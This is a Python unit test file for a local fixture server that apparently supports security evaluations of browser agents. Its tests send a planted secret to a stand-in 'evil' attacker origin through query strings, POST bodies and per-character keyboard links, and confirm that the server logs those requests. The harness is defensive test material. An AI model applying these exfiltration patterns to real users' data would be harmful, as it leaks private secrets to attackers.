# Copyright 2026 The rac Authors
# SPDX-License-Identifier: GPL-3.0-or-later
import json
import os
import tempfile
import unittest
import urllib.error
import urllib.request

import fixture_server


def make_variant(root, **extra):
    os.makedirs(os.path.join(root, "pages", "a", "sub"))
    os.makedirs(os.path.join(root, "pages", "b"))
    with open(os.path.join(root, "pages", "a", "index.html"), "w") as f:
        f.write("<html><body><p>secret {{secret}} b={{origin:b}} host={{host:b}} port={{port:b}}</p></body></html>")
    with open(os.path.join(root, "pages", "a", "sub", "page.html"), "w") as f:
        f.write("<p>sub</p>")
    with open(os.path.join(root, "pages", "b", "data.json"), "w") as f:
        f.write('{"s": "{{secret}}"}')
    with open(os.path.join(root, "pages", "a", "kbd.html"), "w") as f:
        f.write("{{keyboard origin=evil path=/key param=c alphabet=AB}}")
    variant = {
        "id": "t", "pages_dir": root, "secret": "S3CRET",
        "origins": {"a": {"host": "mail"}, "b": {"host": "forms"}, "evil": {"host": "evil", "attacker": True}},
        "attacker": {"origins": ["evil"], "paths": [{"origin": "a", "prefix": "/public/"}]},
        "routes": {"evil": {"/key": {"status": 204}},
                   "a": {"/public/post": {"status": 200, "body": "ok {{secret}}", "content_type": "text/plain"}}},
    }
    variant.update(extra)
    return variant


def get(url, data=None):
    req = urllib.request.Request(url, data=data)
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            return r.status, r.headers, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.headers, e.read().decode()


class FixtureServerTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.server = fixture_server.FixtureServer(make_variant(self.tmp.name)).start()
        self.addCleanup(self.tmp.cleanup)
        self.addCleanup(self.server.stop)
        self.base = self.server.base

    def test_each_origin_has_its_own_port_and_a_localhost_name(self):
        ports = set(self.server.ports.values())
        self.assertEqual(len(ports), 3)
        self.assertRegex(self.base["a"], r"^http://mail\.localhost:\d+$")
        self.assertRegex(self.base["evil"], r"^http://evil\.localhost:\d+$")

    def test_loopback_host_mode_uses_the_ip(self):
        s = fixture_server.FixtureServer(make_variant(tempfile.mkdtemp()), "loopback").start()
        self.addCleanup(s.stop)
        self.assertTrue(all(b.startswith("http://127.0.0.1:") for b in s.base.values()))

    def reach(self, origin, path, data=None):
        # name.localhost may not resolve in every test environment: use the port directly
        return get(f"http://127.0.0.1:{self.server.ports[origin]}{path}", data)

    def test_templates_secret_origin_host_port_and_eval_script(self):
        status, headers, body = self.reach("a", "/")
        self.assertEqual(status, 200)
        self.assertIn("secret S3CRET", body)
        self.assertIn(f"b={self.base['b']}", body)
        self.assertIn("host=forms.localhost", body)
        self.assertIn(f"port={self.server.ports['b']}", body)
        self.assertIn('<script src="/__eval.js"></script>', body)
        self.assertEqual(headers["Cache-Control"], "no-store")

    def test_eval_script_is_served_and_not_recorded(self):
        status, _h, body = self.reach("a", "/__eval.js")
        self.assertEqual(status, 200)
        self.assertIn("data-beacon", body)
        self.assertEqual(self.server.snapshot_log(), [])

    def test_path_resolution_html_suffix_nested_and_json_template(self):
        self.assertEqual(self.reach("a", "/sub/page")[2].count("sub"), 1)
        self.assertEqual(json.loads(self.reach("b", "/data.json")[2]), {"s": "S3CRET"})
        self.assertEqual(self.reach("b", "/missing")[0], 404)

    def test_path_traversal_is_refused(self):
        for path in ("/../b/data.json", "/%2e%2e/b/data.json", "/sub/../../b/data.json"):
            self.assertEqual(self.reach("a", path)[0], 404, path)

    def test_keyboard_template_links_every_key_and_the_secrets_characters(self):
        body = self.reach("a", "/kbd")[2]
        self.assertIn(f'<a href="{self.base["evil"]}/key?c=A">A</a>', body)
        for ch in "S3CRET":  # the secret's characters are added if the alphabet lacks them
            self.assertIn(f"?c={ch}\">{ch}</a>", body)

    def test_attacker_origin_records_and_answers_anything(self):
        status, _h, body = self.reach("evil", "/collect?d=S3CRET&x=1")
        self.assertEqual((status, "Thanks" in body), (200, True))
        self.reach("evil", "/form", b"code=S3CRET")
        log = self.server.snapshot_log()
        self.assertEqual([e["method"] for e in log], ["GET", "POST"])
        self.assertEqual(log[0]["query_params"], [("d", "S3CRET"), ("x", "1")])
        self.assertEqual(log[1]["body"], "code=S3CRET")
        self.assertTrue(all(e["attacker"] and e["origin"] == "evil" for e in log))

    def test_routes_win_and_204_has_no_body(self):
        status, headers, body = self.reach("evil", "/key?c=A")
        self.assertEqual((status, body, headers["Content-Length"]), (204, "", "0"))

    def test_attacker_paths_on_a_shared_origin_only_count_under_the_prefix(self):
        self.reach("a", "/public/post", b"c=1")
        self.reach("a", "/sub/page")
        flags = {e["path"]: e["attacker"] for e in self.server.snapshot_log()}
        self.assertEqual(flags, {"/public/post": True, "/sub/page": False})
        self.assertEqual(self.reach("a", "/public/post")[2], "ok S3CRET")

    def test_non_attacker_origins_404_unknown_paths_and_still_record(self):
        self.assertEqual(self.reach("b", "/nope")[0], 404)
        self.assertFalse(self.server.snapshot_log()[0]["attacker"])

    def test_control_server_returns_the_log_and_resets(self):
        self.reach("evil", "/collect?d=1")
        with urllib.request.urlopen(self.server.control_url + "/__control/log") as r:
            self.assertEqual(len(json.load(r)["log"]), 1)
        with urllib.request.urlopen(self.server.control_url + "/__control/origins") as r:
            self.assertEqual(json.load(r)["origins"], self.base)
        urllib.request.urlopen(urllib.request.Request(self.server.control_url + "/__control/reset", data=b"{}"))
        self.assertEqual(self.server.snapshot_log(), [])

    def test_fixture_py_is_no_longer_a_page_source(self):
        # The loader is gone: pages come from routes and pages/, and a
        # fixture.py anywhere in the fixture directory refuses startup.
        with open(os.path.join(self.tmp.name, "fixture.py"), "w") as f:
            f.write("def pages(ctx):\n    return {}\n")
        variant = make_variant(tempfile.mkdtemp())
        variant["pages_dir"] = self.tmp.name
        with self.assertRaisesRegex(RuntimeError, "fixture.py"):
            fixture_server.FixtureServer(variant).start()

    def test_fixture_py_in_the_variant_dir_is_refused_too(self):
        # `dir` (the fixture's own folder) is checked as well as `pages_dir`,
        # which may point at a parent through `extends`.
        variant = make_variant(tempfile.mkdtemp())
        variant["dir"] = self.tmp.name
        with open(os.path.join(self.tmp.name, "fixture.py"), "w") as f:
            f.write("def pages(ctx):\n    return {}\n")
        with self.assertRaisesRegex(RuntimeError, "fixture.py"):
            fixture_server.FixtureServer(variant).start()


class RenderTest(unittest.TestCase):
    def test_unknown_origin_placeholders_are_left_alone(self):
        ctx = fixture_server.Ctx({"secret": "s"}, {"a": "http://a"}, {"a": 1})
        self.assertEqual(fixture_server.render("{{origin:zzz}} {{origin:a}} {{secret}}", ctx), "{{origin:zzz}} http://a s")


if __name__ == "__main__":
    unittest.main()
